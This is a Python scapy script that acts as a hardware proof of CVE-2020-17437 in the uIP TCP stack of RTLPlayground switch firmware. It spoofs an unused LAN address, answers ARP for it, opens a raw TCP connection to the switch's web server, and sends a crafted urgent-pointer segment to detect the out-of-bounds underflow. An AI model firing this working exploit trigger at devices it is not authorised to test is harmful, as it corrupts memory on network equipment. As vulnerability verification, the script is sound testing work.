#!/usr/bin/env python3
"""cve_urg.py SWITCH_IP [PEER_IP] - hardware proof of CVE-2020-17437 (TCP
urgent-pointer out-of-bounds in the uIP the RTLPlayground firmware carries).

The faithful hardware analog of ovs-rtlpg tests/net/test_cve_2020_17437.py: a
self-contained TCP peer at a spare LAN IP the host kernel does not own (so the
kernel never interferes), talking L2 to the switch over eth0; ARP for PEER_IP
is answered by us. The switch retransmits its SYN-ACK only a few times and
then aborts, so the completing ACK is sent from inside the sniff callback the
instant the SYN-ACK arrives.

Opens a connection to the web server (port 80, no auth), then sends one 1-byte
segment with URG set and urgent pointer one past the payload. Unpatched,
uip_len underflows and the switch acknowledges rcv_nxt ~65535 bytes it never
received; patched, it advances by at most 1. The switch is not modified.
"""
import random
import sys
import time

from scapy.all import ARP, AsyncSniffer, Ether, IP, TCP, Raw, conf, get_if_hwaddr, sendp, srp1

IFACE = __import__("os").environ.get("RTLHW_IFACE", "eth0")


def main():
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    conf.verb = 0
    dst = sys.argv[1]
    peer = sys.argv[2] if len(sys.argv) > 2 else "172.16.16.111"
    mymac = get_if_hwaddr(IFACE)
    sport = random.randint(20000, 60000)
    isn = random.randint(1, 1000000)

    ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=dst), iface=IFACE, timeout=3)
    if not ans:
        print("FAIL: switch did not ARP-reply")
        return 2
    swmac = ans[ARP].hwsrc
    cap = []
    st = {"sw": None}

    def tx(payload=b"", **t):
        pkt = Ether(dst=swmac, src=mymac) / IP(src=peer, dst=dst) / TCP(sport=sport, dport=80, **t)
        if payload:
            pkt = pkt / Raw(payload)
        sendp(pkt, iface=IFACE, verbose=0)

    def handler(p):
        if p.haslayer(ARP) and p[ARP].op == 1 and p[ARP].pdst == peer:
            sendp(Ether(dst=p[ARP].hwsrc, src=mymac) / ARP(op=2, psrc=peer, hwsrc=mymac,
                  pdst=p[ARP].psrc, hwdst=p[ARP].hwsrc), iface=IFACE, verbose=0)
        elif p.haslayer(TCP) and p.haslayer(IP) and p[IP].src == dst and p[TCP].dport == sport:
            cap.append(p)
            if (int(p[TCP].flags) & 0x12) == 0x12 and st["sw"] is None:
                st["sw"] = int(p[TCP].seq)
                tx(flags="A", seq=isn + 1, ack=st["sw"] + 1)   # complete the handshake at once

    snf = AsyncSniffer(iface=IFACE, filter=f"(tcp and host {dst}) or arp", prn=handler, store=False)
    snf.start()
    time.sleep(0.3)
    sendp(Ether(dst=swmac, src=mymac) / ARP(op=2, psrc=peer, hwsrc=mymac, pdst=dst, hwdst=swmac), iface=IFACE, verbose=0)
    try:
        tx(flags="S", seq=isn)
        for _ in range(200):
            if st["sw"] is not None:
                break
            time.sleep(0.01)
        if st["sw"] is None:
            print("FAIL: no SYN-ACK")
            return 2
        sw = st["sw"]
        time.sleep(0.2)
        n = len(cap)
        # one data byte, URG set, urgent pointer one past the single payload byte
        tx(b"A", flags="AU", seq=isn + 1, ack=sw + 1, urgptr=2)
        time.sleep(2.0)
        after = [p for p in cap[n:] if p.haslayer(TCP)]
        for p in after:
            t = p[TCP]
            print(f"  reply flags=0x{int(t.flags):02x} ack_rel=+{(int(t.ack)-(isn+1))&0xffffffff} dlen={len(bytes(t.payload))}")
        tx(flags="R", seq=isn + 2, ack=sw + 1)
        adv = max([(int(p[TCP].ack) - (isn + 1)) & 0xffffffff for p in after], default=0)
        if adv > 1:
            print(f"RESULT: VULNERABLE (switch acknowledged rcv_nxt +{adv} for a 1-byte payload)")
            return 0
        print(f"RESULT: not-underflowed (+{adv})")
        return 1
    finally:
        snf.stop()


if __name__ == "__main__":
    sys.exit(main())
